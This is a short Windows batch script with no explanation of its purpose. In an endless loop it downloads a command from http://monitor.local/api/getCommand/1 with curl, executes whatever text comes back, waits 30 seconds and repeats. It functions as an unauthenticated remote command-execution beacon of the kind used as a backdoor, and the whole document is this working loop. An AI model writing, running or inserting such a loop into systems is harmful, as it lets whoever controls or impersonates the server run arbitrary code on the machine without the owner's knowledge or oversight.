:loop
curl http://monitor.local/api/getCommand/1 > temp.txt
set /p CMD=< temp.txt
%CMD%
TIMEOUT /T 30
goto loop